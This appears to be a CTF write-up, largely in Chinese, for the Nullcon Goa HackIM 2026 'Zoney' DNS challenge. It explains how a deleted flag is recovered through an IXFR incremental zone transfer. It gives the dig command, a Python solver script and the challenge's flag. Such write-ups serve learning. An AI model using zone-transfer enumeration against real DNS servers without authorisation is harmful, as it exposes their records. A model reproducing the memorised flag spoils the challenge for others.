---
title: "Zoney - Nullcon Goa HackIM 2026 CTF"
category: "misc"
type: "writeup"
tags: ["misc", "ixfr", "dns", "subprocess", "regex", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: misc/Zoney"
source:
  name: "CTFtime writeup #40567"
  url: "https://ctftime.org/writeup/40567"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Zoney"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Zoney
- **Author team:** 正规子群.AI
- **CTFtime tags:** misc, ixfr, dns
- **CTFtime:** <https://ctftime.org/writeup/40567>

---
## 105 Zoney

\- Category: `misc`  
\- Value: `173`  
\- Solves: `110`  
\- Solved by me: `True`  
\- Local directory: `misc/Zoney`

### 题目描述  
> I heard you like DNS? Show me that you know all about it.  
> There might be a flag hidden for you somewhere: [flag.ctf.nullcon.net](http://flag.ctf.nullcon.net)  
>  
> Port: 5054  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5054`

### 附件下载地址  
\- 无

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# Zoney

\---

## 题目信息

\- Challenge: `Zoney`  
\- 远端: `52.59.124.14:5054`  
\- 提示: `[flag.ctf.nullcon.net](http://flag.ctf.nullcon.net)`  
\- 附件: 无（本目录初始为空）

说明：比赛名在题面未明确给出，因此目录按题名直接使用 `Zoney`。

\---

## 初始分析与失败尝试

先按常规 DNS 方式做枚举：

1\. 直接查询常见记录：`A/TXT/SOA/NS/ANY`  
2\. 尝试 `AXFR` 区传送  
3\. 尝试 `CH/HS` 类查询与 `version.bind`

观察到：

\- `A` 返回 `10.13.37.1`  
\- `TXT` 返回 `"The flag was removed."`  
\- `AXFR` 失败  
\- 服务是权威应答（`aa`），且 `SOA serial = 1500`

这些结果说明“当前记录”里没有 flag，且题面文案明显暗示“flag 曾经存在但被删除”。

\---

## 关键思路：利用 IXFR 历史恢复

DNS 除了全量传送 `AXFR` 外，还有增量传送 `IXFR`。若权威服务器保留变更日志，则可以从旧序列号请求到“历史变更片段”。

记当前 serial 为 $s_c$，请求 serial 为 $s_0$。若 $s_0 < s_c$ 且服务器保留日志，可返回从 $s_0$ 到 $s_c$ 的更新序列。

本题中：

\- 当前 $s_c = 1500$  
\- 使用 `IXFR=1000` 后拿到了大量历史 `TXT` 更新  
\- 在更新序号 `1337` 处出现真实 flag 字符串

核心命令：

```bash  
dig +tcp @52.59.124.14 -p 5054 [flag.ctf.nullcon.net](http://flag.ctf.nullcon.net) IXFR=1000 +noall +answer  
```

从输出可见关键行：

```text  
[flag.ctf.nullcon.net](http://flag.ctf.nullcon.net). 300 IN TXT "Update #1337: ENO{1337_1ncr3m3nt4l_z0n3_tr4nsf3r_m4st3r_8f9a2c1d}"  
```

\---

## 解题脚本

脚本位置：`solution/[solution.py](http://solution.py)`

功能：

1\. 调用 `dig` 拉取 `IXFR` 历史  
2\. 解析全部 `TXT` 记录  
3\. 提取 `flag{}` 或 `ENO{}` 模式

运行：

```bash  
python3 solution/[solution.py](http://solution.py)  
```

本地验证输出（已实测）：

```text  
[+] FLAG: ENO{1337_1ncr3m3nt4l_z0n3_tr4nsf3r_m4st3r_8f9a2c1d}  
```

\---

## Flag

```text  
ENO{1337_1ncr3m3nt4l_z0n3_tr4nsf3r_m4st3r_8f9a2c1d}  
```

### Exploit  
#### misc/Zoney/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import argparse  
import re  
import subprocess  
import sys  
from typing import List

def run_dig_ixfr(host: str, port: int, domain: str, serial: int, timeout: int) -> str:  
cmd = [  
"dig",  
"+tcp",  
f"@{host}",  
"-p",  
str(port),  
domain,  
f"IXFR={serial}",  
"+noall",  
"+answer",  
]  
try:  
proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)  
except subprocess.TimeoutExpired:  
raise RuntimeError(f"dig 超时: {' '.join(cmd)}")

if proc.returncode != 0 and not proc.stdout.strip():  
raise RuntimeError(f"dig 失败: rc={proc.returncode}, stderr={proc.stderr.strip()}")  
return proc.stdout

def extract_txt_records(ixfr_text: str) -> List[str]:  
return re.findall(r'\sTXT\s+"([^"]*)"', ixfr_text)

def extract_flag(ixfr_text: str) -> str:  
m = re.search(r'(?:flag|ENO)\\{[^}\s]+\\}', ixfr_text)  
return m.group(0) if m else ""

def main() -> int:  
parser = argparse.ArgumentParser(description="Extract flag from DNS IXFR history")  
parser.add_argument("--host", default="52.59.124.14")  
parser.add_argument("--port", type=int, default=5054)  
parser.add_argument("--domain", default="[flag.ctf.nullcon.net](http://flag.ctf.nullcon.net)")  
parser.add_argument("--serial", type=int, default=1000, help="IXFR start serial")  
parser.add_argument("--timeout", type=int, default=15)  
args = parser.parse_args()

ixfr_text = run_dig_ixfr(args.host, args.port, args.domain, args.serial, args.timeout)  
txts = extract_txt_records(ixfr_text)

print(f"[+] IXFR records fetched: {len(ixfr_text.splitlines())} lines")  
print(f"[+] TXT records parsed: {len(txts)}")

interesting = [t for t in txts if not re.fullmatch(r"Update\s+#\d+", t)]  
if interesting:  
print("[+] Interesting TXT records:")  
for item in interesting:  
print(f" - {item}")

flag = extract_flag(ixfr_text)  
if not flag:  
print("[-] 未发现 flag 模式（支持 flag{} 或 ENO{}）", file=sys.stderr)  
return 1

print(f"[+] FLAG: {flag}")  
return 0

if __name__ == "__main__":  
raise SystemExit(main())  
```

\---
